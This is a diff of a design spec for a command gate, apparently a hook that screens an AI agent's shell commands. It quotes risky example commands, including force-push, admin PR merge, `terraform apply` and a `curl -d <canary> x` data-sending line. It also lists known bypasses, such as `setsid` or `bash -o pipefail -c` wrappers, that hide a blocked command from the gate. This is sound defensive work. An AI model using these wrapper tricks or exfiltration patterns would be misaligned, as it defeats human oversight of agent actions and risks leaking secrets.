@@ -53,10 +53,13 @@ The acceptance scenarios, restated:
   dropped one word at a time, so `do echo "git push --force"` stays an `echo`. Only a wrapper jumps
   ahead, because only a wrapper takes option arguments.
 - Q: Does an unreadable `sh -c` body now reach the raw-text rule of #1077? A: Yes, as the arch gate
-  on item 1068 recommended. `_unwrap` raises `ValueError` when the nested `segments` returns
-  `None`, and the outer `segments` catches it and returns `None`. `bash` then applies the raw-text
-  rule, so `bash -c "echo it's; gh pr merge 5 --admin"` is refused with the one-line hint. An
-  unreadable body naming no door program still passes.
+  on item 1068 recommended. When the nested `segments` returns `None`, `_unwrap` returns the
+  marker segment `UNREAD` (no argv, one placeholder target) in its place. `bash` applies the
+  raw-text rule when it sees the marker, so `bash -c "echo it's; gh pr merge 5 --admin"` is refused
+  with the one-line hint. The readable outer segments still reach the leak, infra and other doors
+  (coordinator, before gates: an earlier head returned `None` for the whole text, and
+  `curl -d <canary> x && bash -c "echo it's"` passed where main refused it). An unreadable body
+  naming no door program still passes.
 - Q: Are `fi`, `done`, `}` and `esac` dropped too? A: Not needed. They close a body and stand alone
   after a separator, so they read as a program no door reads.
 
@@ -100,7 +103,8 @@ pass.
   name is in `READ` or starts with `python`; with none, the command is unchanged.
 - **FR-003**: a shell whose dash options before the first plain word include a single-dash cluster
   with `c` has that word read as its body.
-- **FR-004**: an unreadable `sh -c` body makes `segments` return `None`.
+- **FR-004**: an unreadable `sh -c` body leaves the `UNREAD` marker segment; `bash` applies the
+  raw-text rule to a command holding it and reads every other segment as before.
 - **FR-005**: `WRAPPERS` adds `timeout` and `stdbuf`.
 - **FR-006**: `cli/wuwei/` changes by net zero lines or fewer.
 
@@ -133,7 +137,8 @@ outside the list (`setsid`, `flock`, `ionice`).
 2. A wrapper not in the list (`setsid git push --force`) or a shell option with an argument
    (`bash -o pipefail -c 'git push --force'`) still hides the door: the gate probes find it and it
    stays residual.
-3. Raising `ValueError` from `_unwrap` turns a readable outer command with an unreadable nested
-   body into `None`, so the leak and infra doors no longer read the outer segments of that
-   command; a canary in the outer part of such a command passes when the text names no door
-   program.
+3. A caller of `segments` other than `bash` (the PostToolUse `gh pr create` check) ignores the
+   marker: it has no argv, so it reads as no command. A future caller that indexes targets could
+   mistake the placeholder for a file; the marker's text names what it is. An earlier head of this
+   branch raised instead and hid the outer segments from the leak door; tests now pin a canary and
+   `terraform apply` beside an unreadable body.
